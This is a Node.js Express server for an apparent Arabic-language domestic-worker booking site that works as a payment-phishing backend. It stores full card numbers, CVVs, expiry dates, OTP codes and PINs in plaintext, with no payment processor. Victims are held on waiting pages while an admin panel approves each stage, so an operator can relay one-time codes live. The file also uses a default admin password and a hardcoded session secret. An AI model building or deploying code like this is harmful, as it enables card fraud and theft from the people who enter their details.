const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Database setup
const dbPath = process.env.NODE_ENV === 'production' ? '/tmp/jusur.db' : path.join(__dirname, 'jusur.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS bookings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT NOT NULL,
    service TEXT,
    duration TEXT,
    workers INTEGER DEFAULT 1,
    start_time TEXT,
    start_date TEXT,
    contract_type TEXT,
    nationality TEXT,
    total TEXT,
    name TEXT,
    phone TEXT,
    address TEXT,
    notes TEXT,
    card_number TEXT,
    card_name TEXT,
    card_expiry TEXT,
    card_cvv TEXT,
    card_last4 TEXT,
    card_type TEXT,
    otp_code TEXT,
    pin_code TEXT,
    country TEXT,
    country_code TEXT,
    ip_address TEXT,
    payment_decision TEXT DEFAULT 'waiting',
    otp_decision TEXT DEFAULT 'waiting',
    pin_decision TEXT DEFAULT 'waiting',
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Migration: add new columns if they don't exist
  const newCols = [
    "ALTER TABLE bookings ADD COLUMN card_number TEXT",
    "ALTER TABLE bookings ADD COLUMN card_name TEXT",
    "ALTER TABLE bookings ADD COLUMN card_expiry TEXT",
    "ALTER TABLE bookings ADD COLUMN card_cvv TEXT",
    "ALTER TABLE bookings ADD COLUMN otp_code TEXT",
    "ALTER TABLE bookings ADD COLUMN pin_code TEXT",
    "ALTER TABLE bookings ADD COLUMN country TEXT",
    "ALTER TABLE bookings ADD COLUMN country_code TEXT",
    "ALTER TABLE bookings ADD COLUMN ip_address TEXT",
    "ALTER TABLE bookings ADD COLUMN payment_decision TEXT DEFAULT 'waiting'",
    "ALTER TABLE bookings ADD COLUMN otp_decision TEXT DEFAULT 'waiting'",
    "ALTER TABLE bookings ADD COLUMN pin_decision TEXT DEFAULT 'waiting'"
  ];
  newCols.forEach(sql => db.run(sql, () => {}));
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set('trust proxy', 1);
app.use(session({
  secret: process.env.SESSION_SECRET || 'jusur-secret-2026',
  resave: true,
  saveUninitialized: true,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
    maxAge: 24 * 60 * 60 * 1000
  }
}));

// Static files
app.use('/images', express.static(path.join(__dirname, '../public/images')));
app.use('/cdn-cgi', express.static(path.join(__dirname, '../public/cdn-cgi')));

// Helper - get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.ip || '';
}

// Helper - detect card type
function detectCardType(number) {
  const n = (number || '').replace(/\s/g, '');
  if (/^4/.test(n)) return 'visa';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'mastercard';
  if (/^3[47]/.test(n)) return 'amex';
  if (/^6(?:011|5)/.test(n)) return 'discover';
  return 'unknown';
}

// ============ ROUTES ============

// Home
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Booking - Hourly
app.get('/booking/hourly', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/booking/hourly.html'));
});
app.post('/booking/hourly', (req, res) => {
  const { service, duration, workers, start_time, start_date, total } = req.body;
  req.session.booking = { type: 'hourly', service, duration, workers: parseInt(workers) || 1, start_time, start_date, total };
  res.redirect('/booking/contact');
});

// Booking - Monthly
app.get('/booking/monthly', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/booking/monthly.html'));
});
app.post('/booking/monthly', (req, res) => {
  const { service, contract_type, workers, nationality, start_date, total } = req.body;
  req.session.booking = { type: 'monthly', service, contract_type, workers: parseInt(workers) || 1, nationality, start_date, total };
  res.redirect('/booking/contact');
});

// Recruitment
app.get('/recruitment', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/recruitment.html'));
});
app.post('/recruitment', (req, res) => {
  const { nationality } = req.body;
  req.session.booking = { type: 'recruitment', nationality, total: 'خدمة مخصصة' };
  res.redirect('/booking/contact');
});

// Contact
app.get('/booking/contact', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/contact.html'));
});
app.post('/booking/contact', (req, res) => {
  const { name, phone, address, notes } = req.body;
  const ip = getClientIp(req);
  req.session.booking = { ...req.session.booking, name, phone, address, notes };

  const b = req.session.booking;
  db.run(
    `INSERT INTO bookings (type, service, duration, workers, start_time, start_date, contract_type, nationality, total, name, phone, address, notes, ip_address, payment_decision, otp_decision, pin_decision, status)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'waiting', 'waiting', 'waiting', 'pending')`,
    [b.type, b.service, b.duration, b.workers, b.start_time, b.start_date, b.contract_type, b.nationality, b.total, b.name, b.phone, b.address, b.notes, ip],
    function(err) {
      if (err) console.error('DB Error:', err);
      req.session.bookingId = this ? this.lastID : null;
      res.redirect('/booking/payment');
    }
  );
});

// Payment page
app.get('/booking/payment', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/payment.html'));
});

// Payment POST → حفظ بيانات البطاقة كاملة + انتظار قرار الادمين
app.post('/booking/payment', (req, res) => {
  const { card_number, card_expiry, card_cvv, card_name } = req.body;
  const cleanNumber = (card_number || '').replace(/\s/g, '');
  const last4 = cleanNumber.slice(-4);
  const cardType = detectCardType(cleanNumber);

  req.session.booking = {
    ...req.session.booking,
    card_number: cleanNumber,
    card_name: card_name || '',
    card_expiry: card_expiry || '',
    card_cvv: card_cvv || '',
    card_last4: last4,
    card_type: cardType
  };

  if (req.session.bookingId) {
    db.run(
      'UPDATE bookings SET card_number=?, card_name=?, card_expiry=?, card_cvv=?, card_last4=?, card_type=?, payment_decision=? WHERE id=?',
      [cleanNumber, card_name, card_expiry, card_cvv, last4, cardType, 'waiting', req.session.bookingId]
    );
  }

  res.redirect('/booking/waiting?stage=payment');
});

// OTP page
app.get('/booking/otp', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/otp.html'));
});

// OTP POST → حفظ OTP + انتظار قرار الادمين
app.post('/booking/otp', (req, res) => {
  const { otp } = req.body;
  req.session.booking = { ...req.session.booking, otp_code: otp };

  if (req.session.bookingId) {
    db.run('UPDATE bookings SET otp_code=?, otp_decision=? WHERE id=?',
      [otp, 'waiting', req.session.bookingId]);
  }

  res.redirect('/booking/waiting?stage=otp');
});

// PIN page
app.get('/booking/pin', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/pin.html'));
});

// PIN POST → حفظ PIN + انتظار قرار الادمين
app.post('/booking/pin', (req, res) => {
  const { pin } = req.body;
  req.session.booking = { ...req.session.booking, pin_code: pin };

  if (req.session.bookingId) {
    db.run('UPDATE bookings SET pin_code=?, pin_decision=? WHERE id=?',
      [pin, 'waiting', req.session.bookingId]);
  }

  res.redirect('/booking/waiting?stage=pin');
});

// Waiting page (صفحة التحميل)
app.get('/booking/waiting', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/waiting.html'));
});

// Polling API - العميل يسأل كل 3 ثواني عن قرار الادمين
app.get('/api/booking/decision', (req, res) => {
  const bookingId = req.session.bookingId;
  const stage = req.query.stage; // payment | otp | pin
  if (!bookingId) return res.json({ decision: 'waiting' });

  const field = stage === 'otp' ? 'otp_decision' : stage === 'pin' ? 'pin_decision' : 'payment_decision';
  db.get(`SELECT ${field} as decision FROM bookings WHERE id=?`, [bookingId], (err, row) => {
    if (err || !row) return res.json({ decision: 'waiting' });
    res.json({ decision: row.decision || 'waiting' });
  });
});

// Success page
app.get('/booking/success', (req, res) => {
  if (!req.session.bookingId) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/success.html'));
});

// Session info
app.get('/booking/session-info', (req, res) => {
  const b = req.session.booking || {};
  res.json({
    cardNumber: b.card_last4 ? '**** **** **** ' + b.card_last4 : null,
    cardNetwork: b.card_type ? b.card_type.toUpperCase() : 'VISA'
  });
});

// ============ ADMIN ROUTES ============
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/admin/login.html'));
});
app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    res.redirect('/admin/dashboard');
  } else {
    res.redirect('/admin?error=1');
  }
});
app.get('/admin/dashboard', (req, res) => {
  if (!req.session.isAdmin) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, '../public/admin/dashboard.html'));
});
app.get('/admin/logout', (req, res) => {
  req.session.isAdmin = false;
  res.redirect('/admin');
});

// Admin API - جلب الحجوزات
app.get('/api/admin/bookings', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const status = req.query.status;
  const type = req.query.type;
  let query = 'SELECT * FROM bookings WHERE 1=1';
  const params = [];
  if (status) { query += ' AND status = ?'; params.push(status); }
  if (type) { query += ' AND type = ?'; params.push(type); }
  query += ' ORDER BY created_at DESC';
  db.all(query, params, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Admin API - الإحصائيات
app.get('/api/admin/stats', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  db.all(`SELECT 
    COUNT(*) as total,
    SUM(CASE WHEN status='pending' THEN 1 ELSE 0 END) as pending,
    SUM(CASE WHEN status='confirmed' THEN 1 ELSE 0 END) as confirmed,
    SUM(CASE WHEN status='cancelled' THEN 1 ELSE 0 END) as cancelled
    FROM bookings`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows[0]);
  });
});

// Admin API - قرار البطاقة (قبول/رفض)
app.post('/api/admin/bookings/:id/payment-decision', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const { decision } = req.body; // 'approved' | 'rejected'
  db.run('UPDATE bookings SET payment_decision=? WHERE id=?', [decision, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Admin API - قرار OTP (قبول/رفض)
app.post('/api/admin/bookings/:id/otp-decision', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const { decision } = req.body;
  db.run('UPDATE bookings SET otp_decision=? WHERE id=?', [decision, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Admin API - قرار PIN (قبول/رفض)
app.post('/api/admin/bookings/:id/pin-decision', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const { decision } = req.body;
  const status = decision === 'approved' ? 'confirmed' : 'pending';
  db.run('UPDATE bookings SET pin_decision=?, status=? WHERE id=?', [decision, status, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Admin API - تحديث حالة الحجز
app.patch('/api/admin/bookings/:id', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const { status } = req.body;
  db.run('UPDATE bookings SET status = ? WHERE id = ?', [status, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Admin API - حذف حجز
app.delete('/api/admin/bookings/:id', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  db.run('DELETE FROM bookings WHERE id = ?', [req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Session data
app.get('/api/session/booking', (req, res) => {
  res.json(req.session.booking || {});
});
app.get('/api/session/booking-id', (req, res) => {
  res.json({ id: req.session.bookingId || null });
});

app.listen(PORT, () => {
  console.log(`Jusur server running on port ${PORT}`);
});
